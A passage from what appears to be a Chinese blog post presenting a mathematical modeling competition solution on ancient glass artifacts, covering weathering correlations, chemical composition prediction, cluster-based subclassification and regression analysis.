，位于-1和1之间，应用正确。记玻璃纹饰A、B、C为1、2、3。分析得玻璃纹饰与表面风化成正相关（斯皮尔曼相关系数大于0）。从玻璃纹饰角度考虑风化的概率C&gt;B&gt;A，显著性大于0.05说明玻璃纹饰与表面风化的相关性不显著。记高钾玻璃为1，铅钡玻璃为2。分析得玻璃类型与表面风化成正相关（斯皮尔曼相关系数大于0）且其相关性在0.01级别（双尾），相关性显著。从玻璃类型角度考虑风化的概率铅钡玻璃大于高钾玻璃。对蓝绿、浅蓝、紫、深绿、深蓝、浅绿、绿、黑色玻璃编号为1~8，根据斯皮尔曼相关性分析得玻璃颜色与表面风化成负相关，显著性在0.4级别，说明相关性不显著。从颜色角度讲风化概率蓝绿&lt;浅蓝&lt;紫&lt;深绿&lt;深蓝&lt;浅绿&lt;绿&lt;黑色玻璃。</p><p>综上，表面风化和玻璃类型关系最大，和玻璃颜色与纹饰的关系不大。在接下来问题分析中，需要将玻璃类型考虑在内。</p><h5 id="5-1-2文物样品表面有无风化化学成分含量的统计规律"><a href="#5-1-2文物样品表面有无风化化学成分含量的统计规律" class="headerlink" title="5.1.2文物样品表面有无风化化学成分含量的统计规律"></a>5.1.2文物样品表面有无风化化学成分含量的统计规律</h5><p>**Step1.**表单2数据可视化</p><p>为了探究出文物样品表面有无风化化学成分含量的统计规律，我们统计出趋势、中位数、方差等。对数据进行均值比较和方差分析，根据结果使用Python进行数据可视化处理，画出无风化高钾玻璃和铅钡玻璃的化学成分比较折线图、高钾玻璃风化前后对比折线图和铅钡玻璃风化前后对比折线图进行观察。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps19.jpg" style="zoom: 67%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps20.jpg" style="zoom: 67%;" /></center><center>图5-4高钾玻璃风化前后对比折线图（加SiO2和不加SiO2）</center>高钾玻璃风化前后成分对比可知，风化前与风化后的折线变化基本一致，因为风化导致除二氧化硅以外化学成分比例都降低（氧化钠和氧化钾降低较明显）使二氧化硅有些升高外，整体变化稳定。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps25.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps26.jpg" style="zoom:80%;" /></center><center>图5-5铅钡玻璃风化前后对比折线图（加二氧化硅和不加二氧化硅）</center>铅钡玻璃风化前后成分对比可知，风化前与风化后的折线变化基本一致，除了因为风化导致部分化学成分降低使氧化铝和二氧化硅有明显升高外，其他元素比例变化稳定。<p>综上，风化前和风化后的化学成分比例整体变化一致，我们可以针对变化明显的化学成分进行分析找到倍数关系。</p><p>**Step2.**表单2数据处理</p><p>根据题目内容可知表单2给出的相应的主要成分所占比例累加和介于 85%<del>105%之间的数据视为有效数据。通过Excel求和公式，计算出69个文物采样点的主要成分所占比例累加和。其中文物采样点15累加和为79.47%和文物采样点17累加和为71.89%，二者不在85%</del>105%之间，故剔除数据。</p><p>通过对表单2的数据分类整理可知，高钾玻璃都不含有氧化锡，可以在高钾玻璃中不考虑该化学成分。同时，风化后的高钾玻璃不含有氧化钠，氧化铅，氧化钡，氧化锶及二氧化硫这五种化学成分，无法寻找风化前和风化后的联系，化学成分预测上宜通过未风化中的化学成分规律。并且使用SPSS工具进行聚类分析，同样会优先将其中一种单独聚为一类，我们由此认定在该项聚类中，这部分数据没有意义，舍弃进行进一步聚类。</p><p>通过对风化前与风化后化学元素变化折线图5-5和5-6可知，铅钡玻璃中氧化钾、氧化铝、氧化铜、氧化锶风化前与风化后比例没有明显改变，可以认为风化前与风化后比例没有变化，在接下来分析中不做考虑。</p><p>对高钾玻璃和铅钡玻璃的剩余化学成分进行聚类分析，使用SPASS软件分析出化学成分集合分组，即由类似对象组成多个类的结果。处理结果如图5-4和图5-5所示。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps27.png" style="zoom:67%;" /> </center><center>图5-6高钾玻璃各化学成分聚类谱系图</center>分析高钾玻璃各化学成分聚类谱系图可以发现，我们可以将二氧化硅作为第一类，氯化钾和氧化钙作为第二类，将氧化镁、氧化铝、氧化铁以及五氧化二磷作为第三类，将氧化铜作为第四类，从而实现数据的降维。将聚类结果和高钾玻璃统计规律的结果进行相互检验发现相符合。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps28.jpg" style="zoom:67%;" /> </center><center>图5-7铅钡玻璃各化学成分聚类谱系图</center>分析铅钡玻璃各化学成分聚类谱系图可以发现，我们可以将二氧化硅、氧化钠以及氧化铁作为第一类，氧化钙、氧化铅、氧化锡及二氧化硫作为第二类，将氧化镁作为第三类，将氧化二磷作为第四类，从而实现数据的降维。将聚类结果和铅钡玻璃统计规律进行相互检验发现相符合。<h5 id="5-1-3预测风化点在风化前的化学成分含量"><a href="#5-1-3预测风化点在风化前的化学成分含量" class="headerlink" title="5.1.3预测风化点在风化前的化学成分含量"></a>5.1.3预测风化点在风化前的化学成分含量</h5><p>**Step1.**高钾玻璃风化前的化学成分含量预测</p><p>根据相关性分析（分析结果见附录），二氧化硅和其他变量间都是强相关性，可以以二氧化硅为因变量，其他化学成分为自变量，对高钾玻璃的散点图进行曲线拟合。我们选择多项式曲线拟合进行少量数据的情况下拟合出比较好的曲线，原理如下：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps29.jpg" style="zoom: 80%;" /></center> 其中M是多项式的阶数（最高次数），<img src="D:\gitee-blog\source\_posts\国赛数学建模\wps30.jpg" style="zoom:80%;" />是多项式的系数，记作W。<p>使用python软件的sklearn库和matplotlib库生成拟合图，如图5-4所示（文中仅展示部分代表，拟合发现同一类化学成分的曲线趋势基本相同）。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps31.jpg" style="zoom:80%;" /> <img src="D:\gitee-blog\source\_posts\国赛数学建模\wps32.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps33.jpg" style="zoom:80%;" /></center><center>图5-8二氧化硅与其他化学成分的曲线拟合（高钾玻璃）</center>接下来我们还要求出W，建立对应拟合曲线的拟合函数，求出二氧化硅和其他7个化学成分的W值。如下表5-2所示。<center>表5-2二氧化硅和其他7个化学成分的W值</center>| 因变量     |                              W                               || ---------- | :----------------------------------------------------------: || 氧化钾     | [9.35606172e-06 -2.57806774e-03 2.53723140e-01 -1.06974030e+01 1.75202587e+02] || 氧化铝     | [-2.64094146e-05 8.11260817e-03 -9.27383442e-01 4.65868522e+01 -8.59053857e+02] || 氧化铜     | [-2.64094146e-05 8.11260817e-03 -9.27383442e-01 4.65868522e+01 -8.59053857e+02] || 氧化铁     | [2.65598539e-05 -8.49958292e-03 1.00819891e+00 -5.25574184e+01 1.01817760e+03] || 氧化钙     | [-2.66096268e-05 8.24388435e-03 -9.44132282e-01 4.71535967e+01 -8.58821425e+02] || 五氧化二铅 | [1.54677974e-05 -4.92447555e-03 5.80303071e-01 -2.99966231e+01 5.74887003e+02] || 氧化镁     | [2.51296158e-05 -7.72761458e-03 8.82922501e-01 -4.44354852e+01 8.32682964e+02] |<p>最后，对高钾玻璃中风化点在风化前的化学成分含量进行预测（W值在实际使用时小数点取前四位）。</p><p>对于前面分析中高钾玻璃采样点都不含有氧化锡所以该部分选择不填值。风化后的高钾玻璃不含有氧化钠，氧化铅，氧化钡，氧化锶及二氧化硫这五种化学成分，它们的化学含量占比小且最大差值小于2，我们可以用平均值表示这五个元素的化学含量。</p><center>表5-3化学成分比例平均值</center>| 化学成分 | 氧化钠 | 氧化铅 | 氧化钡 | 氧化锡 | 二氧化硫 || -------- | ------ | ------ | ------ | ------ | -------- || 平均值   | 2.7800 | 0.6420 | 1.7950 | 0.0975 | 0.4067   |<p>对于二氧化硅的未风化预测，根据前面分析，我们可以用一个比例系数K 来通过风化值求出未风化的值，利用统计规律求解出比例系数K=0.7280。</p><p>对于剩下的七个化学成分我们通过拟合出来的函数进行求解。最终未风化前的化学成分含量预测结果如下表5-4所示。</p><center>表5-4高钾玻璃中风化点在风化前的化学成分含量的预测结果</center>|        | SiO2    | Na2O   | K2O     | CaO     | MgO    | Al2O3  | Fe2O3  | CuO    | PbO    | BaO   | P2O5   | SrO    | SnO2 | SO2    || ------ | ------- | ------ | ------- | ------- | ------ | ------ | ------ | ------ | ------ | ----- | ------ | ------ | ---- | ------ || **7**  | 65.7673 | 2.7800 | 10.0032 | 11.5770 |        | 6.5340 | 1.6490 | 3.2400 | 0.6420 | 1.795 | 1.4701 | 0.0975 |      | 0.4067 || **9**  | 67.5920 | 2.7800 | 9.5951  | 4.2222  |        | 4.3560 | 3.1040 | 1.5500 | 0.6420 | 1.795 | 0.8435 | 0.0975 |      | 0.4067 || **1**  | 68.7067 | 2.7800 | 9.3013  | 1.4301  |        | 2.6730 | 2.5220 | 0.8400 | 0.6420 | 1.795 | 0.0000 | 0.0975 |      | 0.4067 || **12** | 66.9459 | 2.7800 | 9.7500  | 4.9032  |        | 4.8180 | 2.8130 | 1.6500 | 0.6420 | 1.795 | 0.3615 | 0.0975 |      | 0.4067 || **22** | 65.5685 | 2.7800 | 10.0422 | 11.3046 | 1.6400 | 11.550 | 3.3950 | 0.5500 | 0.6420 | 1.795 | 0.5061 | 0.0975 |      | 0.4067 || **27** | 65.8312 | 2.7800 | 9.9904  | 6.4014  | 1.5400 | 8.2830 | 1.9400 | 1.5400 | 0.6420 | 1.795 | 0.8676 | 0.0975 |      | 0.4067 |<p> **Step2.**铅钡玻璃风化前的化学成分含量预测</p><p>使用python软件的sklearn库和matplotlib库生成拟合曲线图，如图5-5所示：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps34.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps35.jpg" style="zoom:80%;" /></center><center>图5-9二氧化硅与其他化学成分的曲线拟合（铅钡玻璃）</center>通过图像可知，铅钡玻璃的散点图分布情况和高钾玻璃的散点图分布情况不一样，点在整张图上随机分布，故不能通过二氧化硅和其他化学成分拟合出合适的曲线进而得到拟合函数预测出铅钡玻璃风化前的化学成分含量。<p>根据上面聚类分析并结合表单2的统计学规律将铅钡玻璃所有变量划分为4个类，将其设为<img src="D:\gitee-blog\source\_posts\国赛数学建模\wps36.jpg" style="zoom:67%;" />。将铅钡玻璃中氧化钾、氧化铝、氧化铜、氧化锶风化前与风化后比例没有明显改变的4个变量的累加和设为定值<img src="D:\gitee-blog\source\_posts\国赛数学建模\wps37.jpg" style="zoom:67%;" />。根据统计学规律计算出的系数设为<img src="D:\gitee-blog\source\_posts\国赛数学建模\wps38.jpg" style="zoom:67%;" /> </p><p>建立模型为：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps39.jpg" style="zoom:100%;" /> </center><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps40.jpg" style="zoom:100%;" /> </center>将统计学规律计算出的系数<img src="D:\gitee-blog\source\_posts\国赛数学建模\wps41.jpg" style="zoom:80%;" />加入模型得：<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps42.jpg" style="zoom:100%;" /> </center>将铅钡玻璃的数据放入模型，最终未风化前的化学成分含量预测结果如下表5-5所示。<center>表5-5铅钡玻璃中风化点在风化前的化学成分含量的预测结果（部分）</center>|        | **SiO2** | **Na2O** | **K2O** | **CaO** | **MgO** | **Al2O3** | **Fe2O3** | **CuO** | **PbO** | **BaO** | **P2O5** | **SrO** | **SO2** || ------ | -------- | -------- | ------- | ------- | ------- | --------- | --------- | ------- | ------- | ------- | -------- | ------- | ------- || **2**  | 58.3986  |          | 1.5000  | 1.3343  | 0.9569  | 5.7300    | 3.8874    | 0.2600  | 27.8253 |         | 0.6645   | 0.1900  |         || **8**  | 59.6931  |          |         | 0.8437  |         | 1.3400    |           | 1.4100  | 16.3763 | 17.8323 | 0.6642   | 0.3700  | 1.4732  || **8**  | 62.6751  |          |         | 1.8186  |         | 1.1100    |           | 3.1400  | 18.5289 | 2.6720  | 1.3986   | 0.5300  | 8.7363  || **11** | 64.6478  |          | 0.2100  | 2.1510  | 0.5758  | 2.6900    |           | 4.9300  | 14.4977 | 8.3423  | 1.7353   | 0.3700  |         || **19** | 58.6627  |          |         | 1.67393 | 0.4784  | 3.5700    | 2.7797    | 3.5100  | 24.4522 | 3.5485  | 1.6336   | 0.1900  |         || **26** | 59.4844  |          |         | 0.82944 |         | 0.7000    |           | 1.5700  | 16.8616 | 18.4148 | 0.5795   | 0.4500  | 1.1192  |<h4 id="5-2问题二的求解与分析"><a href="#5-2问题二的求解与分析" class="headerlink" title="5.2问题二的求解与分析"></a>5.2问题二的求解与分析</h4><h5 id="5-2-1高钾玻璃、铅钡玻璃的分类规律"><a href="#5-2-1高钾玻璃、铅钡玻璃的分类规律" class="headerlink" title="5.2.1高钾玻璃、铅钡玻璃的分类规律"></a>5.2.1高钾玻璃、铅钡玻璃的分类规律</h5><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps43.jpg" style="zoom:80%;" /> </center><center>图5-10 无风化高钾玻璃和铅钡玻璃的化学成分比较折线图</center>假设高钾玻璃和铅钡玻璃在分类之初不考虑风化对其的影响。<p>通过表单2中的数据分析风化前高钾玻璃和铅钡玻璃各化学成分含量并计算出均值。由上图均值比对可得出如下规律：高钾玻璃氧化钾的含量远高于铅钡玻璃，铅钡玻璃氧化铅和氧化钡的含量远高于高钾玻璃，以化学成分含量为依据而将其分为高钾玻璃和铅钡玻璃，分类标准合理。</p><h5 id="5-2-2-数据预处理"><a href="#5-2-2-数据预处理" class="headerlink" title="5.2.2 数据预处理"></a>5.2.2 数据预处理</h5><p>在进行分类之前先进行数据的预处理。</p><p>玻璃的主要原料是石英砂，主要化学成分是二氧化硅（SiO2），所以二氧化硅这一化学成分的存在是古代玻璃所具有的共性，故将二氧化硅这一化学成分不作为分类依据。另外，针对不同类型的玻璃在分类时考虑自身突出特性对其他化学成分的掩盖影响应当剔除，由此铅钡玻璃在进行内部分类时，氧化铅和氧化钡不作为分类依据。同理，高钾玻璃在进行亚分类时氧化钾不作为分类依据。</p><p>数据来源上，将附件中表单2原始数据处理为高钾未风化、高钾风化、铅钡风化、铅钡无风化四种类型。根据假设条件，玻璃的分类是在完整未经风化状态下进行的，故而不考虑风化后的玻璃样本而将着眼点放在风化前的各样本数据上，这其中也包括了表面风化但局部未风化的样本即含有未风化点的样本，如23、25、28、29号文物等。经过数据剔除，最终考虑的样本数量状态为：无风化高钾玻璃12个样本，无风化铅钡玻璃23个样本。接下来对这些样本进行亚类划分。</p><h5 id="5-2-3-亚类划分"><a href="#5-2-3-亚类划分" class="headerlink" title="5.2.3 亚类划分"></a>5.2.3 亚类划分</h5><p>本文通过SPSS软件，采用系统聚类模型分别针对高钾和铅钡玻璃进行亚分类。</p><p>系统聚类分析将各样品各看成一类，然后计算类与类之间的距离，选择距离最小的一对合并为新类，计算新类与其他各类的距离，再将距离最近的两类合并，这样依次迭代，直到所有样品合为一类为之，由此实现不同样本之间的聚类。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps44.jpg" style="zoom:100%;" /> </center><center>图5-11 聚类分析基本思想</center>在确定要分类的数量时，本文采用肘部法则，用聚合系数折线图估计聚类的数量。聚合系数折线图的横纵坐标分别为聚类类别数K和聚合系数J。运用SPSS系统聚类分析可以得到聚合系数J，之后借助excel将系数降序排列，做出散点折线图，分析变化趋势。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps45.jpg" style="zoom:100%;" /> <img src="D:\gitee-blog\source\_posts\国赛数学建模\wps46.jpg" style="zoom:100%;" /></center><center>&nbsp&nbsp&nbsp&nbsp&nbsp图5-12 高钾玻璃聚类折线图&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp 图5-13铅钡玻璃聚类折线图&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</center>由折线变化趋势可得高钾玻璃在聚类别数为3时下降趋势渐缓，故判定高钾玻璃最佳聚类数为3，同理，判定铅钡玻璃最佳聚类数为6。<p>另外，在亚类划分时要考虑适合的化学成分，意即在划分完成后仍需进一步分析系统聚类结果中化学成分的内在联系，由此，在聚类完成后加入主观统计学分析，以系统聚类分析的结果为基础，与均值的比对为指引，寻找同一类样本之间化学成分上的联系，进而总结出规律，必要时可以重新组合类。</p><p>下面首先进行系统聚类分析：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps47.jpg" style="zoom:80%;" /> </center><center>图5-14 高钾玻璃12个样本的谱系图</center>表中纵轴以Casen的形式显示代表原表单中样本的排列顺序，以下分类中为方便表示直接使用数字n代表某样本。<center>表5-6 高钾玻璃文物采样点与序号的对应关系</center>| 序号   | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   | 12   || ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- || 采样点 | 01   | 03.1 | 03.2 | 04   | 0    | 06.1 | 06.2 | 13   | 14   | 16   | 21   | 18   |<center>表5-7 铅钡玻璃文物采样点与序号对应关系（部分）</center>| 序号   | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   | 12   | …    || ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- || 采样点 | 20   | 24   | 30.1 | 30.2 | 31   | 32   | 33   | 35   | 37   | 45   | 46   | 47   | …    |<p>注：03.1代表03部位1；03.2代表03部位2；30.1代表30部位1；30.2代表30部位2；</p><p>结合上图聚类结果将12个样本分为3类，分类结果如下： </p><center>表5-8 高钾玻璃初步聚类分析</center>| 类别  | 样本                || ----- | ------------------- || 类别1 | 1 2 3 4 5 8 9 10 11 || 类别2 | 6 7                 || 类别3 | 12                  |<p>之后进行统计学分析，观察各类之中有无化学成分含量突出或远高于均值的，抽象出分类标准。经过化学成分分析统计，比对得出高钾的三种分类标准：低铅钡、高磷、高铜。</p><center>表 5-9 高钾玻璃亚分类结果</center>| 类别            | 样本              || --------------- | ----------------- || 类别1（低铅钡） | 1 2 4 5 8 9 10 12 || 类别2（高磷）   | 6 7               || 类别3（高铜）   | 3 11              |<p> 同理，对于铅钡玻璃进行如下划分。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps48.jpg" style="zoom: 67%;" /> </center><center>图5-15 铅钡玻璃23个样品聚类情况</center>结合上图分类结果，将23个样本分为6类。<center>表 5-10 铅钡玻璃初步聚类分析</center>| 类别  | 样本                                    || ----- | --------------------------------------- || 类别1 | 1、21 、22                              || 类别2 | 12 、14 、18 、19                       || 类别3 | 6 、7 、8 、10 、11 、13、 15 、16、 23 || 类别4 | 4 、5                                   || 类别5 | 17 、20                                 || 类别6 | 2 、3、 9                               |<p>而后通过excel分析聚类中各化学成分含量，与均值进行比较得出5种分类标准：高磷、高钠、高铝、钙铁、高铜。</p><center>表5-11 铅钡玻璃亚分类结果</center>| 类别          | 样本                                    || ------------- | --------------------------------------- || 类别1（高磷） | 1 、21 、22                             || 类别2（高钠） | 12、 14 、18 、19 、13、 15             || 类别3（高铝） | 6、 7、 8 、10 、11 、16、 23 、17 、20 || 类别4（钙铁） | 3 、4、 5                               || 类别5（高铜） | 2 、9                                   |<h5 id="5-2-4合理性和敏感性检验"><a href="#5-2-4合理性和敏感性检验" class="headerlink" title="5.2.4合理性和敏感性检验"></a>5.2.4合理性和敏感性检验</h5><p>本文使用轮廓系数进行合理性检验，遍历簇数，计算对应轮廓系数，选择轮廓系数最大时对应的聚类模型。</p><p>单一轮廓系数：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps49.jpg" style="zoom:100%;" /> </center>其中a(i)表示i所属簇内其他样本的平均距离，b(i)表示i与其他簇的样本平均距离的最小值[3]。<p>聚类总体轮廓系数：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps50.jpg" style="zoom:100%;" /> </center>总轮廓系数S越接近1说明聚类越合理。<p>敏感性分析上，将具有典型化学成分含量特征的样本加入数据集，再次进行聚类分析，观测聚类结果是否与预料当中相同。本文中将问题一中预测的风化前的数据加入到高钾风化前、铅钡风化前的表单中进行聚类分析。分析是否与预期一致。</p><h4 id="5-3问题三的求解与分析"><a href="#5-3问题三的求解与分析" class="headerlink" title="5.3问题三的求解与分析"></a>5.3问题三的求解与分析</h4><h5 id="5-3-1鉴别未知类别玻璃文物所属类型"><a href="#5-3-1鉴别未知类别玻璃文物所属类型" class="headerlink" title="5.3.1鉴别未知类别玻璃文物所属类型"></a>5.3.1鉴别未知类别玻璃文物所属类型</h5><p>观察表单3所给出的未知类别玻璃文物数据发现，每条数据分为文物编号、表面风化和化学成分3个变量，我们判别玻璃文物类型前可以先将数据划分为无风化的未知类别玻璃文物数据和风化的未知类别玻璃文物数据，然后再次对表单2的数据规律按照风化和无风化进行总结，找到合适作为自变量的化学成分，通过给予的未知类别玻璃文物数据和后期回归方程模型的建立计算出的预测结果，根据总结出来的数据规律判别是该化学成分属于高钾玻璃还是铅钡玻璃。最后根据哪一种类型可能性更大来决定该未知类别玻璃文物所属类型。</p><p><strong>Step1</strong> 表单2数据规律分析</p><p>在建立多元回归方程模型的时候发现，14个化学成分的比例分布不平衡，如果按照将显著性最大的二氧化硅作为因变量之一，来建立多元回归模型的话会导致影响因变量的自变量只有二氧化硅甚至使用的自变量皆无意义，无法将其余13个化学成分的比例价值凸显出来，进而能准确利用结果进行未知类别玻璃文物所属类型的鉴别。所以我们转而对表单2的数据间统计规律进一步深究，使用能显著代表文物类型且非二氧化硅的化学成分。</p><p>首先对于表单2的数据我们先划分为风化和无风化两个大类，在其中又分四小类分别是无风化高钾玻璃、无风化铅钡玻璃、无风化铅钡玻璃和风化铅钡玻璃。通过Python软件的matplotlib库画出箱图展现每一个小类中一维变量的统计规律。如下图5-16所示。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps51.png" style="zoom:100%;" /> </center><center>图5-16未风化高钾玻璃的箱图</center>箱图最大有点不受异常值的影响，它可以用一种相对稳定的方式描述数据的离散分布情况。箱图共有七大组成部分：上线、上四分位数、中位数、下四分位数、下线、四分位距离以及异常值。<p>之后根据箱图展现的统计规律和散点图展现的分布情况，进行以鉴别玻璃类型为目的数据整理，如下表5-12所示。</p><center>表5-12数据规律统计表（部分）</center>| 表面风化 |   类型    |      氧化钠       |        氧化钾         |      氧化钙       |                         |          氧化铝          || :------: | :-------: | :---------------: | :-------------------: | :---------------: | :---------------------: | :----------------------: ||   风化   | 高钾玻璃  |        无         |       0.59~1.01       | 0.21~1.07Max:1.66 |        0.54~0.64        |         0.81~3.5         || 铅钡玻璃 | 0.8~2.22  |     0.14~0.4      | 0.37~3.58Max:5.18,6.4 |     0.47~1.54     |   0.45~5.73Max:13.65    |                          ||  无风化  | 高钾玻璃  |     2.1~3.38      |      5.19~14.52       | 5.41~8.7Min:2.01  |        0.52~1.98        | 3.05~6.19Max:10.05,11.15 || 铅钡玻璃 | 0.92~3.38 | 0.11~0.35Max:0.71 |       0.38~2.98       |     0.51~1.67     | 1.44~6.5Max:14.34,12.69 |                          |<p>通过表5-12可知，高钾玻璃和铅钡玻璃的部分相同化学成分的变化范围是不相交的且存在明显的差异，我们可以在使用模型前直接判断出它的类型。同时可以将数据分类：第一类数据变化范围大，数值大可以考虑作为因变量，如未风化高钾的氧化铅和氧化钡；第二类数据整体波动适中，只出现几个较大值或较小值，可以考虑作为因变量或自变量，如氧化铜、氧化铁和氧化铝；第三类数据波动小且整体数值也小，还具有可以判别文物类型的特点，一般将其作为自变量，计算出的结果可以尽可能在表5-x的范围内，如未风化高钾的氧化锶。</p><p><strong>Step1</strong> 2多元回归模型求取文物所属类别</p><p>多元回归模型基本形式为：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps52.jpg" style="zoom:100%;" /> </center>其中，![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps133.jpg)为各项系数，![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps134.jpg)为误差值。<p>在无风化高钾玻璃类别中，我们使用SPASS软件进行多次计算，获得如下回归模型分析表5-13。</p><p>因变量：氧化钙</p><p>预测变量：（常量），氧化铝，氧化钡，氧化铅</p><center>表5-13 回归方程分析表</center>|                                                              | R     | R方   | 调整后R方 | 德宾-沃森 | 显著性 || ------------------------------------------------------------ | ----- | ----- | --------- | --------- | ------ || ![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps139.jpg) | 0.844 | 0.713 | 0.659     | 1.556     | 0.000  |<table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>（常数）</td><td>-2.103</td><td>-3.145</td><td>0.006</td><td></td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps140.jpg" alt="img"></td><td>0.121</td><td>5.195</td><td>0.000</td><td>1.300</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps141.jpg" alt="img"></td><td>-0.036</td><td>-1.048</td><td>0.310</td><td>1.218</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps142.jpg" alt="img"></td><td>0.261</td><td>4.987</td><td>0.000</td><td>1.275</td></tr></tbody></table><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps53.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps54.jpg" style="zoom:80%;" /></center><center>   图5-17 氧化钙直方图           图5-18 正态P-P图</center>因变量：氧化铜<p>预测变量：（常量），氧化铝，氧化钡，氧化铅</p><center>表5-14 回归方程分析表</center>|                                                              | R     | R方   | 调整后R方 | 德宾-沃森 | 显著性 || ------------------------------------------------------------ | ----- | ----- | --------- | --------- | ------ || ![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps148.jpg) | 0.904 | 0.818 | 0.785     | 1.260     | 0.000  |<table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>（常数）</td><td>-1.782</td><td>-1.613</td><td>0.125</td><td></td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps149.jpg" alt="img"></td><td>0.024</td><td>0.596</td><td>0.559</td><td>1.404</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps150.jpg" alt="img"></td><td>0.303</td><td>8.550</td><td>0.000</td><td>1.061</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps151.jpg" alt="img"></td><td>0.039</td><td>0.539</td><td>0.678</td><td>1.475</td></tr></tbody></table><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps55.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps56.jpg" style="zoom:80%;" /></center><center>图5-19 氧化铜直方图  图5-20 氧化钙正态P-P图</center>因变量：氧化钠<p>预测变量：（常量），氧化铝<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps154.jpg" alt="img">，氧化钡<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps155.jpg" alt="img">，氧化铅<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps156.jpg" alt="img">，氧化铜<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps157.jpg" alt="img"></p><p>表5-15 回归方程分析表</p><table><thead><tr><th></th><th>R</th><th>R方</th><th>调整后R方</th><th>德宾-沃森</th><th>显著性</th></tr></thead><tbody><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps158.jpg" alt="img"></td><td>0.904</td><td>0.818</td><td>0.785</td><td>1.260</td><td>0.000</td></tr></tbody></table><table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>常数</td><td>1.504</td><td>.241</td><td>.891</td><td></td></tr><tr><td>氧化铅</td><td>-.047</td><td>-.401</td><td>.705</td><td>5.436</td></tr><tr><td>氧化钡</td><td>.249</td><td>.779</td><td>.471</td><td>6.629</td></tr><tr><td>氧化铜</td><td>1.191</td><td>2.652</td><td>.045</td><td>1.476</td></tr><tr><td>氧化铝</td><td>-.059</td><td>-.208</td><td>.843</td><td>11.614</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps159.jpg" alt="img"><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps160.jpg" alt="img"> </p><p>​            图5-20 氧化钠直方图                             图5-21 氧化钠正态P-P图</p><p>因变量：氧化钡            预测变量：（常量），氧化铜</p><p>表5-16 回归方程分析表</p><table><thead><tr><th></th><th>R</th><th>R方</th><th>调整后R方</th><th>德宾-沃森</th><th>显著性</th></tr></thead><tbody><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps162.jpg" alt="img"></td><td>0.902</td><td>0.813</td><td>0.803</td><td>1.118</td><td>0.000</td></tr></tbody></table><table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>常数</td><td>4.658</td><td>6.213</td><td>0.000</td><td></td></tr><tr><td>氧化铜</td><td>2.718</td><td>9.091</td><td>0.000</td><td>1.000</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps163.jpg" alt="img"><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps164.jpg" alt="img"> </p><p>​         图5-22 氧化钡直方图                            图 5-23 氧化钡 